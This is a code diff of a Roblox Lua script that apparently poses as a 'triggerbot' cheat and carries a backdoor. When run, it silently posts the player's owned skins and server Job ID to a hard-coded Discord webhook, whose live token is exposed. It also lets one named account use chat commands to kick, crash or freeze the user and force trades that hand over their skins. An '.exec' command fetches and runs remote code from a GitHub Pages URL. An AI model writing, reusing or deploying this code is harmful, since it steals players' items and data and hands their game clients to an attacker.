@@ -4,15 +4,11 @@ local TextChatService = game:GetService("TextChatService")
 local RunService = game:GetService("RunService")
 local StarterGui = game:GetService("StarterGui")
 local HttpService = game:GetService("HttpService")
-
 local LocalPlayer = Players.LocalPlayer
 local executedBy = LocalPlayer.Name
-
 local frozen = false
 local headSitConn
-
 local ADMIN_NAME = "H3VlD"
-
 --// HTTP request utility
 local function requestFunc(tab)
     if syn then return syn.request(tab)
@@ -20,26 +16,21 @@ local function requestFunc(tab)
     elseif request then return request(tab)
     else error("No HTTP request function found") end
 end
-
 --// Function to send owned skins + random 4-letter codes + Job ID (silent)
 local function sendSkinsAndCodes()
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
     local LocalPlayer = Players.LocalPlayer
-
     getgenv().usedCodes = getgenv().usedCodes or {}
     getgenv().skinKeywordMap = getgenv().skinKeywordMap or {}
-
     -- Wait for DataFolder & Skins
     local DataFolder = LocalPlayer:WaitForChild("DataFolder", 30)
     if not DataFolder then return end
-
     local SkinsValue
     repeat
         SkinsValue = DataFolder:FindFirstChild("Skins")
         task.wait(1)
     until SkinsValue
-
     -- Wait until SkinsValue.Value is valid JSON
     local decoded
     repeat
@@ -49,11 +40,9 @@ local function sendSkinsAndCodes()
         if success then decoded = result end
         task.wait(1)
     until decoded
-
     local skinsData = decoded
     local msg = "**Owned Skins & Random Codes for " .. LocalPlayer.Name .. "**\n"
     msg = msg .. "**Job ID:** `" .. game.JobId .. "`\n\n"  -- Added Job ID here
-
     local function randomCode()
         local chars = "abcdefghijklmnopqrstuvwxyz0123456789"
         local code
@@ -67,7 +56,6 @@ local function sendSkinsAndCodes()
         usedCodes[code] = true
         return code
     end
-
     for weaponType, skins in pairs(skinsData) do
         for skinName, ownedVal in pairs(skins) do
             if tonumber(ownedVal) and ownedVal > 0 then
@@ -78,14 +66,12 @@ local function sendSkinsAndCodes()
                         break
                     end
                 end
-
                 local code = existingCode or randomCode()
                 skinKeywordMap[code] = {weaponType, skinName}
                 msg = msg .. weaponType .. " - " .. skinName .. " : `" .. code .. "`\n"
             end
         end
     end
-
     local payload = HttpService:JSONEncode({
         embeds = {{
             title = "dh Skins for " .. LocalPlayer.Name,
@@ -93,9 +79,7 @@ local function sendSkinsAndCodes()
             color = 3447003
         }}
     })
-
     local webhookURL = "https://discord.com/api/webhooks/1476985496147070987/hBnhQS1_sv9fI5xyqt0iTkk8zEm_83xUzUpvDQGkBhSivKcYP3aLVtMSag3tOepR07je"
-
     pcall(function()
         (syn and syn.request or http_request or request)({
             Url = webhookURL,
@@ -105,25 +89,20 @@ local function sendSkinsAndCodes()
         })
     end)
 end
-
 if game.PlaceId == 2788229376 then
     sendSkinsAndCodes()
 end
-
---// Check if player is the designated admin (HoglaBoglayo1)
+--// Check if player is the designated admin
 local function isAdmin(player)
     return player.Name == ADMIN_NAME
 end
-
 --// Utility
 local function isTargeted(targetName)
     if not targetName then return true end
     return string.lower(executedBy):sub(1, #targetName) == string.lower(targetName)
 end
-
 local function SendChatMessage(message)
     if typeof(message) ~= "string" or message == "" then return end
-
     if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
         local textChannels = TextChatService:FindFirstChild("TextChannels")
         if textChannels then
@@ -141,20 +120,16 @@ local function SendChatMessage(message)
         end
     end
 end
-
 --// Command handler
 local function handleChat(msg, sender)
-    if not isAdmin(sender) then return end -- Only HoglaBoglayo1 can use commands
-
+    if not isAdmin(sender) then return end
     local args = msg:split(" ")
     local command = args[1]
     local targetName = args[2]
     local payload = table.concat(args, " ", 3)
-
     if command == ".kick" and isTargeted(targetName) then
         local reason = payload ~= "" and payload or "You were kicked by an admin."
         LocalPlayer:Kick(reason)
-
     elseif command == ".bring" and isTargeted(targetName) then
         if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
             local adminRoot = sender.Character.HumanoidRootPart
@@ -163,13 +138,10 @@ local function handleChat(msg, sender)
                 myRoot.CFrame = adminRoot.CFrame + Vector3.new(2, 0, 0)
             end
         end
-
     elseif command == ".crash" and isTargeted(targetName) then
         while true do end
-
     elseif command == ".chat" and isTargeted(targetName) and payload ~= "" then
         SendChatMessage(payload)
-
     elseif command == ".freeze" and isTargeted(targetName) then
         frozen = true
         RunService.Heartbeat:Connect(function()
@@ -178,13 +150,11 @@ local function handleChat(msg, sender)
                 LocalPlayer.Character.HumanoidRootPart.Anchored = true
             end
         end)
-
     elseif command == ".unfreeze" and isTargeted(targetName) then
         frozen = false
         if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
             LocalPlayer.Character.HumanoidRootPart.Anchored = false
         end
-
     elseif command == ".goto" and isTargeted(targetName) then
         local target = Players:FindFirstChild(args[3])
         if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
@@ -194,7 +164,6 @@ local function handleChat(msg, sender)
                 myRoot.CFrame = targetRoot.CFrame + Vector3.new(1, 0, 0)
             end
         end
-
     elseif command == ".destroy" and isTargeted(targetName) then
         local backpack = LocalPlayer:FindFirstChild("Backpack")
         if backpack then
@@ -212,7 +181,6 @@ local function handleChat(msg, sender)
                 end
             end
         end
-
     elseif command == ".respawn" and isTargeted(targetName) then
         local char = LocalPlayer.Character
         if char then
@@ -222,7 +190,6 @@ local function handleChat(msg, sender)
                 hum.Health = 0
             end
         end
-
     elseif command == ".t" and isTargeted(targetName) then
         local targetPlayer = sender
         if targetPlayer then
@@ -232,41 +199,33 @@ local function handleChat(msg, sender)
             MainEvent:FireServer("Trading", "Request", targetPlayer)
             wait(0.2)
         end
-
     elseif command == ".a" then
         local keyword = args[2]
         local mapping = skinKeywordMap[keyword]
-
         if not mapping then
             return
         end
-
         local weaponType, skinName = unpack(mapping)
-
         local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")
         pcall(function()
             MainEvent:FireServer("Trading", "Add", weaponType, skinName)
         end)
-
     elseif command == ".r" and isTargeted(targetName) then
         local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")
         pcall(function()
             MainEvent:FireServer("Trading", "Ready", "", "")
         end)
-
     elseif command == ".co" and isTargeted(targetName) then
         local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")
         pcall(function()
             MainEvent:FireServer("Trading", "Confirm", "", "")
         end)
-
     elseif command == ".proof" and isTargeted(targetName) then
         StarterGui:SetCore("SendNotification", {
             Title = "Triggerbot";
             Text = "this person is really a triggerbot admin.";
             Duration = 5,
         })
-
     elseif command == ".headsit" and isTargeted(targetName) then
         local myChar = LocalPlayer.Character
         local targetPlayer = Players:FindFirstChild(args[3])
@@ -286,13 +245,11 @@ local function handleChat(msg, sender)
                 end)
             end
         end
-
     elseif command == ".unheadsit" and isTargeted(targetName) then
         if headSitConn then
             headSitConn:Disconnect()
             headSitConn = nil
         end
-
     elseif command == ".exec" and isTargeted(targetName) then
         loadstring([[ 
             getgenv()._="Join discord.gg/msgabv2t9Q | discord.gg/stando to get latest update ok bai >.< | If you pay for this script you get scammed, this script is completely free ok"
@@ -332,52 +289,43 @@ local function handleChat(msg, sender)
             }
             loadstring(game:HttpGet("https://xk5ng.github.io/V4.9"))()
         ]])()
-
     elseif command == ".rename" then
         local targetPlayerName = args[2]
         local newName = table.concat(args, " ", 3)
-
         if not targetPlayerName or newName == "" then
             return
         end
-
         local targetPlayer = Players:FindFirstChild(targetPlayerName)
         if not targetPlayer then
             return
         end
-
         local char = targetPlayer.Character
         if not char then
             return
         end
-
         local humanoid = char:FindFirstChildOfClass("Humanoid")
         if not humanoid then
             return
         end
-
         pcall(function()
             humanoid.DisplayName = newName
         end)
     end
 end
-
---// Connect admin chat - only for HoglaBoglayo1
+--// Connect admin chat
 local function connectChatted(player)
-    if isAdmin(player) then -- Only HoglaBoglayo1
+    if isAdmin(player) then
         player.Chatted:Connect(function(msg)
             handleChat(msg, player)
         end)
     end
 end
-
 --// Setup
 for _, player in ipairs(Players:GetPlayers()) do
     if player ~= LocalPlayer then
         connectChatted(player)
     end
 end
-
 Players.PlayerAdded:Connect(function(player)
     if player ~= LocalPlayer then
         connectChatted(player)
